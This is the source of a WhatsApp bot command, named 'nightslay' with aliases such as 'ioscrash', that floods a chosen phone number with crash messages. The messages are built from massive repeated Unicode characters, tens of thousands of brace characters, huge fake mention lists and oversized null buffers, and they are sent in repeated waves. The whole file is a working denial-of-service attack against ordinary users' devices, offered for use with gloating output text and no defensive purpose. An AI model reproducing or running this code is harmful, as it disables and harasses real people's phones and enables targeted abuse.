const { generateWAMessageFromContent } = require("@whiskeysockets/baileys");
const crypto = require('crypto');
const attackManager = require('../lib/attackManager');
const helpers = require('../lib/helpers');

const randomDelay = (min, max) => new Promise(r => setTimeout(r, Math.floor(Math.random() * (max - min + 1)) + min));

module.exports = {
  name: 'nightslay',
  aliases: ['slay', 'ioscrash', 'applecrash', 'iphonekill', 'ioskiller', 'fruitninja', 'applebye'],
  description: '👿 Lord Devine Attack - iOS device destruction demon',
  ownerOnly: true,
  groupOnly: false,

  async execute(sock, msg, args, { sender, chatId }) {
    const target = args[0];
    const ownerNumbers = helpers.getOwnerNumbers();
    const ownerJid = ownerNumbers[0] ? `${ownerNumbers[0]}@s.whatsapp.net` : sender;
    
    if (!target) {
      return await sock.sendMessage(chatId, { 
        text: ` So you mumu like this I no know 🤦

📱 ᴜsᴀɢᴇ: .ɴɪɢʜᴛsʟᴀʏ 234✘✘
🛑 sᴛᴏᴘ: .ɴɪɢʜᴛsʟᴀʏ sᴛᴏᴘ` 
      });
    }

    if (target.toLowerCase() === 'stop') {
      const stopped = attackManager.stopAllAttacksForSender(sender);
      return await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ 🛑 ᴀᴛᴛᴀᴄᴋ ʜᴀʟᴛᴇᴅ 🛑
╚═══════════════════════════════════════════╝

${stopped > 0 ? `✅ sᴛᴏᴘᴘᴇᴅ ${stopped} ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋ(s)` : '⚠️ ɴᴏ ᴀᴄᴛɪᴠᴇ ᴀᴛᴛᴀᴄᴋs ғᴏᴜɴᴅ'}

👿 "ᴛʜᴇ ᴅᴇᴍᴏɴ ʀᴇsᴛs... ғᴏʀ ɴᴏᴡ" ☠️
╰────────────────────────────────────────╯` 
      });
    }

    const targetJid = target.includes('@') ? target : `${target}@s.whatsapp.net`;
    const attackId = attackManager.generateAttackId(sender, targetJid, 'nightslay');

    if (attackManager.isAttackActive(attackId)) {
      return await sock.sendMessage(chatId, { 
        text: `⚠️ ᴀᴛᴛᴀᴄᴋ ᴀʟʀᴇᴀᴅʏ ʀᴜɴɴɪɴɢ ᴏɴ ᴛʜɪs ᴛᴀʀɢᴇᴛ!\n\n🛑 ᴜsᴇ .ɴɪɢʜᴛsʟᴀʏ sᴛᴏᴘ ᴛᴏ ʜᴀʟᴛ` 
      });
    }

    attackManager.startAttack(attackId, {
      sender,
      target: targetJid,
      commandName: 'nightslay',
      chatId
    });

    await sock.sendMessage(chatId, { 
      text: `╔═══════════════════════════════════════════╗
║ 👿 ɴɪɢʜᴛsʟᴀʏ ᴅᴇᴍᴏɴ ᴜɴʟᴇᴀsʜᴇᴅ 👿
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
⚡ sᴛᴀᴛᴜs: ɪɴɪᴛɪᴀʟɪᴢɪɴɢ ɪᴏs ᴅᴇᴍᴏɴ...
🔄 ᴄʏᴄʟᴇs: 0/100

👿 "ᴛʜᴇ ᴅᴀʀᴋɴᴇss ᴄᴏɴsᴜᴍᴇs" ☠️
╰────────────────────────────────────────╯` 
    });

    const texts = [
      String.fromCharCode(0xA9BE).repeat(90000),
      String.fromCharCode(0x17DD).repeat(90000),
      String.fromCharCode(0x1BC0).repeat(90000),
      "\u200C\u200D\u200E\u200F\u202A\u202B\u202C\u202D\u202E\u2060\u2061\u2062\u2063\uFEFF".repeat(60000)
    ];

    const VampireCrashiPhone = async () => {
      await randomDelay(200, 400);
      try {
        await sock.relayMessage(targetJid, {
          extendedTextMessage: {
            text: "iOS CRASH" + texts[0].substring(0, 50000),
            contextInfo: {
              fromMe: false,
              stanzaId: targetJid,
              participant: targetJid,
              quotedMessage: { conversation: "NIGHTRAIDERS" + texts[1].substring(0, 50000) },
              disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        }, { participant: { jid: targetJid } }, { messageId: null });
      } catch (err) {
        console.error('VampireCrashiPhone error:', err.message);
      }
    };

    const VampireiPhone = async () => {
      await randomDelay(150, 350);
      try {
        await sock.relayMessage(targetJid, {
          extendedTextMessage: {
            text: "NIGHT RAIDERS iOS",
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: targetJid,
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [{ jid: targetJid, callOutcome: "1" }],
                },
              },
              remoteJid: targetJid,
              forwardingScore: 9999999,
              isForwarded: true,
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        }, { participant: { jid: targetJid } });
      } catch (err) {
        console.error('VampireiPhone error:', err.message);
      }
    };

    const VampireBlankIphone = async () => {
      await randomDelay(200, 400);
      try {
        const messsage = {
          botInvokeMessage: {
            message: {
              newsletterAdminInviteMessage: {
                newsletterJid: "33333333333333333@newsletter",
                newsletterName: "NIGHT RAIDERS" + texts[0].substring(0, 80000),
                jpegThumbnail: "",
                caption: texts[2].substring(0, 80000),
                inviteExpiration: Date.now() + 1814400000,
              },
            },
          },
        };
        await sock.relayMessage(targetJid, messsage, { userJid: targetJid });
      } catch (err) {
        console.error('VampireBlankIphone error:', err.message);
      }
    };

    const AndroidKiller = async () => {
      await randomDelay(250, 500);
      try {
        await sock.relayMessage(targetJid, {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: { hasMediaAttachment: false, title: "LORD DEVINE NIGHT RAIDERS" },
                body: { text: texts[0].substring(0, 60000) },
                nativeFlowMessage: { messageParamsJson: "{".repeat(50000) }
              }
            }
          }
        }, {});
      } catch (err) {
        console.error('AndroidKiller error:', err.message);
      }
    };

    const MrHeatDemon = async () => {
      await randomDelay(200, 450);
      try {
        const payload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: { title: "LORD DEVINE NIGHT RAIDERS", hasMediaAttachment: false },
                body: { text: texts[1].substring(0, 50000) },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(50000),
                  buttons: [{ name: "single_select", buttonParamsJson: JSON.stringify({ status: true }) }],
                },
                contextInfo: {
                  isForwarded: true,
                  forwardingScore: 999,
                  externalAdReply: {
                    title: "LORD DEVINE",
                    body: texts[2].substring(0, 10000),
                    mediaType: 1,
                    thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg",
                  },
                }
              }
            }
          }
        };
        await sock.relayMessage(targetJid, payload, {});
      } catch (err) {
        console.error('MrHeatDemon error:', err.message);
      }
    };

    const FlowXNull = async () => {
      await randomDelay(150, 350);
      try {
        const MSG = {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "LORD DEVINE NIGHT RAIDERS\n" + "@0@1".repeat(20000),
                  format: "DEFAULT",
                  contextInfo: {
                    mentionedJid: [
                      targetJid,
                      "0@s.whatsapp.net",
                      ...Array.from({ length: 20000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    ],
                    disappearingMode: { initiator: "CHANGED_IN_CHAT", trigger: "CHAT_SETTING" },
                  }
                },
                nativeFlowResponseMessage: {
                  name: "night_raiders_flame",
                  paramsJson: "{".repeat(40000) + "}".repeat(40000), 
                  version: 3
                }
              }
            }
          }
        };
        await sock.relayMessage(targetJid, MSG, { participant: { jid: targetJid } });
      } catch (err) {
        console.error('FlowXNull error:', err.message);
      }
    };

    const omenAttack = async () => {
      for (let wave = 0; wave < 5; wave++) {
        if (!attackManager.isAttackActive(attackId)) break;
        for (const text of texts) {
          try {
            await randomDelay(100, 250);
            const payload = await generateWAMessageFromContent(targetJid, {
              viewOnceMessage: {
                message: {
                  interactiveMessage: {
                    header: { title: "LORD DEVINE OMEN STRIKE", hasMediaAttachment: true },
                    body: { text: "\n".repeat(500) + text.substring(0, 80000) },
                    nativeFlowMessage: {
                      messageParamsJson: '{"data":' + '"'.repeat(40000) + "ꦾ",
                      buttons: Array(15).fill().map(() => ({
                        name: "quick_reply",
                        buttonParamsJson: JSON.stringify({
                          crash: text.substring(0, 8000),
                          overflow: new Array(50000).fill("NIGHT").join("")
                        })
                      }))
                    },
                    contextInfo: {
                      forwardingScore: 999999,
                      isForwarded: true,
                      externalAdReply: {
                        title: "YOUR PHONE IS DYING",
                        body: text.substring(0, 30000),
                        mediaType: 2,
                        thumbnailUrl: "https://files.catbox.moe/ykvioj.jpg"
                      }
                    }
                  }
                }
              }
            }, {});

            for (let i = 0; i < 5; i++) {
              try {
                await sock.relayMessage(targetJid, payload.message, { messageId: payload.key.id + i });
                await randomDelay(30, 80);
              } catch (_) {}
            }
          } catch (err) {
            console.error('Omen attack error:', err.message);
          }
        }
      }
    };

    const kill = async () => {
      for (let wave = 0; wave < 15; wave++) {
        if (!attackManager.isAttackActive(attackId)) break;
        try {
          await randomDelay(200, 400);
          const p1 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                imageMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7118-24/999999999_000000000000000000000000000000_n.enc",
                  mimetype: "image/jpeg",
                  fileLength: "999999999999",
                  jpegThumbnail: Buffer.alloc(1024 * 1024, 0),
                  contextInfo: {
                    mentionedJid: Array.from({length: 50000}, () => `${Math.floor(Math.random() * 9999999999)}@s.whatsapp.net`),
                    forwardingScore: 999999999,
                    isForwarded: true
                  }
                }
              }
            }
          }, {});

          const p2 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                newsletterAdminInviteMessage: {
                  newsletterJid: "0".repeat(99999) + "@newsletter",
                  newsletterName: texts[0].substring(0, 100000),
                  caption: ""
                }
              }
            }
          }, {});

          const p3 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: { text: "ꦾ" },
                  nativeFlowMessage: {
                    name: "DEATH",
                    paramsJson: "\u0000".repeat(500000) + texts[1].substring(0, 100000)
                  },
                  messageContextInfo: { messageSecret: crypto.randomBytes(64) }
                }
              }
            }
          }, {});

          const p4 = await generateWAMessageFromContent(targetJid, {
            viewOnceMessage: {
              message: {
                videoMessage: {
                  fileLength: "999999999999999",
                  seconds: 999999999,
                  mediaKey: crypto.randomBytes(32).toString('base64'),
                  streamingSidecar: Buffer.alloc(2 * 1024 * 1024, 0),
                  contextInfo: {
                    externalAdReply: {
                      title: "",
                      body: texts[2].substring(0, 100000),
                      thumbnail: Buffer.alloc(1024 * 1024, 0)
                    },
                    mentionedJid: Array(100000).fill("0@s.whatsapp.net")
                  }
                }
              }
            }
          }, {});

          for (let i = 0; i < 10; i++) {
            const payloads = [p1, p2, p3, p4];
            for (const payload of payloads) {
              try {
                await sock.relayMessage(targetJid, payload.message, { messageId: payload.key.id });
                await randomDelay(30, 80);
              } catch (_) {}
            }
          }
        } catch (err) {
          console.error('Nightslay kill wave error:', err.message);
        }
      }
    };

    try {
      await VampireCrashiPhone();
      await VampireiPhone();
      await VampireBlankIphone();
      await AndroidKiller();
      await MrHeatDemon();
      await FlowXNull();
      await omenAttack();
      await kill();

      attackManager.stopAttack(attackId);

      await sock.sendMessage(chatId, { 
        text: `╔═══════════════════════════════════════════╗
║ ✅ ɴɪɢʜᴛsʟᴀʏ ᴄᴏᴍᴘʟᴇᴛᴇ ✅
╚═══════════════════════════════════════════╝

🎯 ᴛᴀʀɢᴇᴛ: ${target}
⚡ sᴛᴀᴛᴜs: ɪᴏs ᴅᴇᴍᴏɴ ᴜɴʟᴇᴀsʜᴇᴅ

👿 "ᴛʜᴇ ᴅᴀʀᴋɴᴇss ʜᴀs ᴄᴏɴsᴜᴍᴇᴅ" ☠️
╰────────────────────────────────────────╯` 
      });
    } catch (err) {
      console.error('Nightslay execution error:', err);
      attackManager.stopAttack(attackId);
      await sock.sendMessage(chatId, { 
        text: `⛔ ᴇʀʀᴏʀ: ${err.message}` 
      });
    }
  }
};
